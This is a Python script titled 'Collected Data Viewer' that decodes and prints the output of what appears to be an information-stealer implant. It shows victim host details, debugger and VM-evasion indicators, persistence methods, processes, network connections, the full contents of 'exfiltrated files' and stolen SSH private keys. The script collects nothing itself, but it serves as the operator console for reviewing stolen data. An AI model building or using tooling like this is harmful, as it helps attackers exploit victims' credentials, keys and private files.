#!/usr/bin/env python3

import json
import base64
import sys
import os
from datetime import datetime

def print_separator(title=""):
    if title:
        print(f"\n{'='*70}")
        print(f"  {title}")
        print(f"{'='*70}")
    else:
        print(f"{'='*70}")

def print_subsection(title):
    print(f"\n{'-'*50}")
    print(f"  {title}")
    print(f"{'-'*50}")

def decode_if_base64(data):
    try:
        if isinstance(data, str):
            decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
            if all(32 <= ord(c) <= 126 or c in '\n\r\t ' for c in decoded[:100]):
                return decoded
    except:
        pass
    return data

def print_system_info(system_info):
    print_separator("SYSTEM INFORMATION")
    
    print(f"  Timestamp:          {system_info.get('timestamp', 'N/A')}")
    print(f"  Hostname:           {system_info.get('hostname', 'N/A')}")
    print(f"  Username:           {system_info.get('username', 'N/A')}")
    print(f"  OS:                 {system_info.get('os', 'N/A')}")
    print(f"  OS Release:         {system_info.get('os_release', 'N/A')}")
    print(f"  Kernel:             {system_info.get('os_version', 'N/A')}")
    print(f"  Architecture:       {system_info.get('architecture', 'N/A')}")
    print(f"  Processor:          {system_info.get('processor', 'N/A')}")
    print(f"  CPU Model:          {system_info.get('cpu_model', 'N/A')}")
    print(f"  Home Directory:     {system_info.get('home_directory', 'N/A')}")
    print(f"  Local IP:           {system_info.get('local_ip', 'N/A')}")
    print(f"  External IP:        {system_info.get('external_ip', 'N/A')}")
    print(f"  Logged In Users:    {system_info.get('logged_in_users', 'N/A')}")
    print(f"  Execution Environment: {system_info.get('execution_environment', 'N/A')}")
    print(f"  Debugger Detected:  {system_info.get('debugger_detected', 'N/A')}")
    
    if system_info.get('vm_environment_indicators'):
        print(f"  VM Indicators:      {', '.join(system_info['vm_environment_indicators'])}")
    
    if system_info.get('persistence_methods'):
        print(f"  Persistence Methods: {', '.join(system_info['persistence_methods'])}")

def print_memory_info(system_info):
    if 'memory_info' in system_info:
        print_subsection("MEMORY USAGE")
        memory_data = decode_if_base64(system_info['memory_info'])
        print(memory_data)

def print_disk_info(system_info):
    if 'disk_usage' in system_info:
        print_subsection("DISK USAGE")
        disk_data = decode_if_base64(system_info['disk_usage'])
        print(disk_data)

def print_network_connections(system_info):
    if 'network_connections' in system_info and system_info['network_connections'] != "Unable to retrieve":
        print_subsection("NETWORK CONNECTIONS (COMPLETE)")
        network_data = decode_if_base64(system_info['network_connections'])
        print(network_data)

def print_running_processes(system_info):
    if 'running_processes' in system_info and system_info['running_processes'] != "Unable to retrieve":
        print_subsection("RUNNING PROCESSES (COMPLETE)")
        process_data = decode_if_base64(system_info['running_processes'])
        print(process_data)

def print_file_data(file_data):
    if not file_data:
        return
    
    print_separator("EXFILTRATED FILES")
    
    for filepath, fileinfo in file_data.items():
        print_subsection(f"FILE: {filepath}")
        print(f"  Status: {fileinfo.get('status', 'N/A')}")
        
        if fileinfo.get('status') == 'success':
            print(f"  Size: {fileinfo.get('size', 0)} bytes")
            content = decode_if_base64(fileinfo.get('content', ''))
            print(f"\n  Complete Content:")
            print(f"  {'-'*40}")
            print(content)
            print(f"  {'-'*40}")
            print(f"  End of file: {filepath}")
        else:
            print(f"  Reason: {fileinfo.get('reason', 'Unknown')}")

def print_ssh_keys(ssh_keys):
    if not ssh_keys:
        return
    
    print_separator("SSH KEYS FOUND")
    
    for keypath, keycontent in ssh_keys.items():
        print_subsection(f"KEY: {keypath}")
        decoded_key = decode_if_base64(keycontent)
        print(f"  Complete Key Content:")
        print(f"  {'-'*40}")
        print(decoded_key)
        print(f"  {'-'*40}")
        print(f"  End of key: {keypath}")

def print_summary(data):
    print_separator("EXFILTRATION SUMMARY")
    
    system_info = data.get('system_info', {})
    file_data = data.get('file_data', {})
    ssh_keys = data.get('ssh_keys', {})
    
    print(f"  Exfiltration Type: {data.get('exfiltration_type', 'N/A')}")
    print(f"  System Info Fields: {len(system_info)}")
    
    successful_files = sum(1 for f in file_data.values() if f.get('status') == 'success')
    total_files = len(file_data)
    print(f"  Files Collected: {successful_files}/{total_files}")
    
    if successful_files > 0:
        for filepath, fileinfo in file_data.items():
            if fileinfo.get('status') == 'success':
                print(f"    - {filepath} ({fileinfo.get('size', 0)} bytes)")
    
    print(f"  SSH Keys Found: {len(ssh_keys)}")
    
    if system_info.get('timestamp'):
        print(f"  Collection Time: {system_info['timestamp']}")
    
    if system_info.get('network_connections') and system_info['network_connections'] != "Unable to retrieve":
        network_data = decode_if_base64(system_info['network_connections'])
        connection_count = len([line for line in network_data.split('\n') if line.strip()])
        print(f"  Network Connections: {connection_count} lines")
    
    if system_info.get('running_processes') and system_info['running_processes'] != "Unable to retrieve":
        process_data = decode_if_base64(system_info['running_processes'])
        process_count = len([line for line in process_data.split('\n') if line.strip()])
        print(f"  Running Processes: {process_count} lines")

def view_collected_data(filename):
    if not os.path.exists(filename):
        print(f"[!] Error: File '{filename}' not found!")
        return
    
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        return
    
    print_banner()
    print(f"\n[*] Viewing: {filename}")
    print(f"[*] File Size: {os.path.getsize(filename):,} bytes")
    
    system_info = data.get('system_info', {})
    file_data = data.get('file_data', {})
    ssh_keys = data.get('ssh_keys', {})
    
    print_summary(data)
    print_system_info(system_info)
    print_memory_info(system_info)
    print_disk_info(system_info)
    print_network_connections(system_info)
    print_running_processes(system_info)
    print_file_data(file_data)
    print_ssh_keys(ssh_keys)
    
    print_separator("END OF REPORT")
    print(f"\n[*] Complete data successfully decoded and displayed\n")

def print_banner():
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║       ██████╗  █████╗ ████████╗ █████╗                    ║
║       ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗                   ║
║       ██║  ██║███████║   ██║   ███████║                   ║
║       ██║  ██║██╔══██║   ██║   ██╔══██║                   ║
║       ██████╔╝██║  ██║   ██║   ██║  ██║                   ║
║       ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝                   ║
║                                                           ║
║       ██╗   ██╗██╗███████╗██╗    ██╗███████╗██████╗       ║ 
║       ██║   ██║██║██╔════╝██║    ██║██╔════╝██╔══██╗      ║
║       ██║   ██║██║█████╗  ██║ █╗ ██║█████╗  ██████╔╝      ║
║       ╚██╗ ██╔╝██║██╔══╝  ██║███╗██║██╔══╝  ██╔══██╗      ║
║        ╚████╔╝ ██║███████╗╚███╔███╔╝███████╗██║  ██║      ║
║         ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝      ║
║                                                           ║
║              Collected Data Viewer v1.0                   ║
╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 view_data.py <path_to_json_file>")
        print("Example: python3 view_data.py Collected_Data/kali_20260522_192359.json")
        sys.exit(1)
    
    view_collected_data(sys.argv[1])